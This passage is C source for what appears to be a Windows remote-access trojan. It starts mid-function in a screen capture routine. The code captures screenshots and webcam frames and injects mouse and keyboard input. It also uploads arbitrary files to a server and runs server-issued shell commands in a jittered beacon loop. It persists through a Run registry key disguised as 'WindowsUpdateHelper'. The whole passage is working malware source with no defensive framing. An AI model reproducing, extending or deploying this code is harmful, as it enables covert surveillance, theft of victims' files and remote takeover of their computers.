    if ((size_t)h != 0 && rowbytes > SIZE_MAX / (size_t)h) {
        DeleteObject(bmp); DeleteDC(mdc); ReleaseDC(NULL, dc); return NULL;
    }
    size_t imgsize = rowbytes * (size_t)h;
    if (imgsize == 0 || imgsize > 512ULL * 1024 * 1024) {
        DeleteObject(bmp); DeleteDC(mdc); ReleaseDC(NULL, dc); return NULL;
    }

    size_t total = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imgsize;

    BITMAPFILEHEADER bfh = {0};
    bfh.bfType    = 0x4D42;
    bfh.bfOffBits = sizeof(bfh) + sizeof(bih);
    bfh.bfSize    = (DWORD)total;

    u8 *buf = (u8*)malloc(total);
    if (buf) {
        memcpy(buf, &bfh, sizeof(bfh));
        memcpy(buf + sizeof(bfh), &bih, sizeof(bih));
        BITMAPINFO bi = {0};
        bi.bmiHeader = bih;
        GetDIBits(dc, bmp, 0, (UINT)h,
                  buf + sizeof(bfh) + sizeof(bih), &bi, DIB_RGB_COLORS);
        *out_len = total;
    }
    DeleteObject(bmp);
    DeleteDC(mdc);
    ReleaseDC(NULL, dc);
    return buf;
}

static void task_screenshot(void) {
    size_t bmp_len = 0;
    u8 *bmp = capture_screen(&bmp_len);
    if (!bmp) { post_result("screenshot", "[screenshot failed]"); return; }
    post_upload("screenshot.bmp", bmp, bmp_len);
    free(bmp);
}

/* ── avicap32 webcam (VFW stack) ─────────────────────────────────────────
 * NOTE: avicap32 requires a VFW-compatible capture driver.  Modern UVC
 * cameras may not expose a VFW interface.  If capDriverConnect returns
 * FALSE, the server receives the error string below.
 */
static void task_webcam(void) {
    HWND cap = capCreateCaptureWindowA("67s_cap", WS_POPUP, 0, 0, 320, 240, NULL, 0);
    if (!cap) { post_result("webcam", "[webcam: no capture window]"); return; }

    if (!capDriverConnect(cap, 0)) {
        DestroyWindow(cap);
        post_result("webcam", "[webcam: no VFW driver — modern UVC cameras unsupported]");
        return;
    }

    Sleep(700);
    capGrabFrame(cap);
    Sleep(200);

    char tmp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp_path);
    strncat(tmp_path, "67swc.bmp", MAX_PATH - strlen(tmp_path) - 1);
    capFileSaveDIB(cap, tmp_path);
    capDriverDisconnect(cap);
    DestroyWindow(cap);

    HANDLE fh = CreateFileA(tmp_path, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (fh == INVALID_HANDLE_VALUE) {
        DeleteFileA(tmp_path);
        post_result("webcam", "[webcam: frame file not created]");
        return;
    }

    LARGE_INTEGER fsz_li;
    GetFileSizeEx(fh, &fsz_li);
    /* SIZE_T avoids 32-bit truncation on large frame buffers */
    SIZE_T fsz = (SIZE_T)fsz_li.QuadPart;
    if (fsz == 0 || fsz > 50ULL * 1024 * 1024) {
        CloseHandle(fh); DeleteFileA(tmp_path);
        post_result("webcam", "[webcam: frame size out of range]");
        return;
    }

    u8 *buf = (u8*)malloc(fsz);
    if (!buf) { CloseHandle(fh); DeleteFileA(tmp_path); return; }

    SIZE_T total = 0; DWORD rd = 0;
    while (total < fsz &&
           ReadFile(fh, buf + total, (DWORD)(fsz - total), &rd, NULL) && rd > 0)
        total += rd;
    CloseHandle(fh);
    DeleteFileA(tmp_path);

    if (total == fsz)
        post_upload("webcam.bmp", buf, total);
    else
        post_result("webcam", "[webcam: short read]");

    free(buf);
}

/* ── SendInput remote control ────────────────────────────────────────────
 * NOTE: Remote desktop is screenshot-polling — not a live stream.
 * Inputs are injected via SendInput with MOUSEEVENTF_VIRTUALDESK for
 * multi-monitor support.  Unicode/IME/dead keys have limited coverage.
 */
static void send_mouse_abs(int x, int y) {
    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int ox = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int oy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    DWORD nx = (DWORD)(((long long)(x - ox) * 65535LL) / (sw > 0 ? sw : 1));
    DWORD ny = (DWORD)(((long long)(y - oy) * 65535LL) / (sh > 0 ? sh : 1));
    INPUT in = {0};
    in.type       = INPUT_MOUSE;
    in.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
    in.mi.dx      = (LONG)nx;
    in.mi.dy      = (LONG)ny;
    SendInput(1, &in, sizeof(INPUT));
}

static void send_mouse_click(int x, int y, DWORD down_flag, DWORD up_flag) {
    send_mouse_abs(x, y);
    Sleep(30);
    INPUT in[2] = {0};
    in[0].type = INPUT_MOUSE; in[0].mi.dwFlags = down_flag;
    in[1].type = INPUT_MOUSE; in[1].mi.dwFlags = up_flag;
    SendInput(2, in, sizeof(INPUT));
}

static void send_vk(WORD vk) {
    INPUT in[2] = {0};
    in[0].type       = INPUT_KEYBOARD; in[0].ki.wVk = vk;
    in[1].type       = INPUT_KEYBOARD; in[1].ki.wVk = vk;
    in[1].ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(2, in, sizeof(INPUT));
}

static void send_char(char c) {
    SHORT vk = VkKeyScanA(c);
    if (vk == -1) return;
    BOOL shift = (BOOL)((vk >> 8) & 1);
    if (shift) {
        INPUT s = {0}; s.type = INPUT_KEYBOARD; s.ki.wVk = VK_SHIFT;
        SendInput(1, &s, sizeof(INPUT));
    }
    INPUT in[2] = {0};
    in[0].type       = INPUT_KEYBOARD; in[0].ki.wVk = (WORD)(vk & 0xFF);
    in[1].type       = INPUT_KEYBOARD; in[1].ki.wVk = (WORD)(vk & 0xFF);
    in[1].ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(2, in, sizeof(INPUT));
    if (shift) {
        INPUT s = {0}; s.type = INPUT_KEYBOARD; s.ki.wVk = VK_SHIFT;
        s.ki.dwFlags = KEYEVENTF_KEYUP;
        SendInput(1, &s, sizeof(INPUT));
    }
}

/* ── file pull ───────────────────────────────────────────────────────────── */
static void task_upload(const char *path, const char *name) {
    HANDLE fh = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (fh == INVALID_HANDLE_VALUE) {
        post_result("upload", "[upload: open failed]"); return;
    }

    LARGE_INTEGER fsz_li;
    if (!GetFileSizeEx(fh, &fsz_li)) {
        CloseHandle(fh); post_result("upload", "[upload: size failed]"); return;
    }

    ULONGLONG fsz64 = (ULONGLONG)fsz_li.QuadPart;
    if (fsz64 > (ULONGLONG)MAX_UPLOAD_BYTES) {
        CloseHandle(fh);
        post_result("upload", "[upload: file too large (>35 MB)]"); return;
    }
    DWORD fsz = (DWORD)fsz64;

    u8 *buf = (u8*)malloc(fsz);
    if (!buf) { CloseHandle(fh); post_result("upload", "[upload: alloc failed]"); return; }

    DWORD rd = 0, total = 0;
    while (total < fsz &&
           ReadFile(fh, buf + total, fsz - total, &rd, NULL) && rd > 0)
        total += rd;
    CloseHandle(fh);

    if (total < fsz) {
        free(buf); post_result("upload", "[upload: short read]"); return;
    }

    post_upload(name, buf, total);
    free(buf);
}

/* ── HKCU Run key persistence ────────────────────────────────────────────── */
static void install_persistence(void) {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) return;
    HKEY hk = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) return;
    RegSetValueExA(hk, "WindowsUpdateHelper", 0, REG_SZ,
                   (BYTE*)path, (DWORD)(strlen(path) + 1));
    RegCloseKey(hk);
}

static void remove_persistence(void) {
    HKEY hk = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) return;
    RegDeleteValueA(hk, "WindowsUpdateHelper");
    RegCloseKey(hk);
}

/* ── beacon loop ─────────────────────────────────────────────────────────── */
static void beacon_loop(void) {
    for (;;) {
        char *task = fetch_task();
        if (task) {
            const char *type = task_get(task, "type");
            if (type) {
                if (strcmp(type, "noop") == 0) {
                    /* intentional no-op */
                } else if (strcmp(type, "shell") == 0) {
                    const char *cmd = task_get(task, "cmd");
                    if (cmd) task_shell(cmd);
                } else if (strcmp(type, "screenshot") == 0) {
                    task_screenshot();
                } else if (strcmp(type, "webcam") == 0) {
                    task_webcam();
                } else if (strcmp(type, "mousemove") == 0) {
                    const char *sx = task_get(task, "x");
                    const char *sy = task_get(task, "y");
                    if (sx && sy) send_mouse_abs(atoi(sx), atoi(sy));
                } else if (strcmp(type, "lclick") == 0) {
                    const char *sx = task_get(task, "x");
                    const char *sy = task_get(task, "y");
                    if (sx && sy)
                        send_mouse_click(atoi(sx), atoi(sy),
                                         MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP);
                } else if (strcmp(type, "rclick") == 0) {
                    const char *sx = task_get(task, "x");
                    const char *sy = task_get(task, "y");
                    if (sx && sy)
                        send_mouse_click(atoi(sx), atoi(sy),
                                         MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP);
                } else if (strcmp(type, "dblclick") == 0) {
                    const char *sx = task_get(task, "x");
                    const char *sy = task_get(task, "y");
                    if (sx && sy) {
                        send_mouse_click(atoi(sx), atoi(sy),
                                         MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP);
                        Sleep(50);
                        send_mouse_click(atoi(sx), atoi(sy),
                                         MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP);
                    }
                } else if (strcmp(type, "keypress") == 0) {
                    const char *svk = task_get(task, "vk");
                    if (svk) send_vk((WORD)strtol(svk, NULL, 0));
                } else if (strcmp(type, "typetext") == 0) {
                    const char *txt = task_get(task, "text");
                    if (txt) { const char *p = txt; while (*p) send_char(*p++); }
                } else if (strcmp(type, "upload") == 0) {
                    const char *p2 = task_get(task, "path");
                    const char *n  = task_get(task, "name");
                    if (p2 && n) task_upload(p2, n);
                } else if (strcmp(type, "sleep") == 0) {
                    const char *ms = task_get(task, "ms");
                    if (ms) {
                        long v = atol(ms);
                        if (v < 100)       v = 100;
                        if (v > 86400000L) v = 86400000L;
                        g_sleep_ms = (DWORD)v;
                    }
                } else if (strcmp(type, "die") == 0) {
                    free(task);
                    remove_persistence();   /* uninstall Run key — die = full uninstall */
                    inet_cleanup();
                    ExitProcess(0);
                }
            }
            free(task);
        }

        /* sleep g_sleep_ms ± BEACON_JITTER_MS/2 for jitter */
        DWORD jitter = 0;
        BCryptGenRandom(NULL, (u8*)&jitter, sizeof(jitter),
                        BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        jitter = jitter % (BEACON_JITTER_MS + 1);
        long long raw = (long long)g_sleep_ms
                      + (long long)jitter
                      - (long long)(BEACON_JITTER_MS / 2);
        if (raw < 100 || raw > 86400000LL) raw = (long long)g_sleep_ms;
        Sleep((DWORD)raw);
    }
}

/* ── entry point ──────────────────────────────────────────────────────────
 *
 * Startup order:
 *   1. Single-instance mutex check
 *   2. Master key hex validation (exit cleanly on placeholder zeros)
 *   3. Generate per-run UUID
 *   4. inet_init (retry up to 60× / ~10 min)
 *   5. do_register (retry up to 120× / ~30 min, then give up)
 *   6. install_persistence — ONLY after first successful registration
 *   7. beacon_loop
 */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    /* 1. single-instance mutex */
    HANDLE mutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (mutex) CloseHandle(mutex);
        return 0;
    }

    /* 2. validate keys — exit cleanly if still placeholder all-zeros */
    if (validate_hex_key(MASTER_AES_HEX,  64) != 0 ||
        validate_hex_key(MASTER_HMAC_HEX, 64) != 0) {
        if (mutex) CloseHandle(mutex);
        ExitProcess(1);
    }

    /* 3. UUID */
    gen_uuid(g_uuid);

    /* 4. WinINet — up to 60 retries × 10 s */
    inet_init();
    for (int i = 0; i < 60 && g_conn == NULL; i++) {
        Sleep(10000);
        inet_init();
    }
    if (!g_conn) {
        if (mutex) CloseHandle(mutex);
        ExitProcess(1);
    }

    /* 5. Register — cap at 120 attempts × 15 s (~30 min), then give up */
    int reg_attempts = 0;
    while (do_register() != 0) {
        if (++reg_attempts > 120) {
            inet_cleanup();
            if (mutex) CloseHandle(mutex);
            ExitProcess(1);
        }
        Sleep(15000);
    }

    /* 6. Persistence — installed ONLY after confirmed successful registration */
    install_persistence();

    /* 7. Beacon */
    beacon_loop();

    /* unreachable (die exits via ExitProcess) */
    inet_cleanup();
    if (mutex) CloseHandle(mutex);
    return 0;
}
